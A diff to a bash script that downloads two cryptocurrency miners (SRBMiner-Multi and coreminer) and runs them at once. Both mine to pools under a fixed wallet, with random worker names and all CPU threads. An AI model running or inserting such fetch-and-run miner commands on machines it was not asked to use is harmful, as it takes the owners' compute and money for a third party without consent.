@@ -1,8 +1,15 @@
 #!/bin/bash
 apt update
 apt install -y wget sudo curl
+
+wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.8.8/SRBMiner-Multi-2-8-8-Linux.tar.gz
+tar -xzvf SRBMiner-Multi-2-8-8-Linux.tar.gz
+cd SRBMiner-Multi-2-8-8
+./SRBMiner-MULTI --algorithm randomy --pool sg.luckypool.io:3118 --wallet cb1145cf4139a506a5395155bd5128152b673cc18377.$(echo $RANDOM | md5sum | head -c 10) --cpu-threads $(nproc --all)
+
 wget https://github.com/catchthatrabbit/coreminer/releases/download/v0.19.88/coreminer-linux-x86_64.tar.gz
 tar xf coreminer-linux-x86_64.tar.gz
 cd coreapp
 ./coreminer -P stratum1+tcp://cb1145cf4139a506a5395155bd5128152b673cc18377.$(echo $RANDOM | md5sum | head -c 10)@eu.catchthatrabbit.com:8008 \
      -P stratum1+tcp://cb1145cf4139a506a5395155bd5128152b673cc18377.$(echo $RANDOM | md5sum | head -c 10)@as.catchthatrabbit.com:8008
+
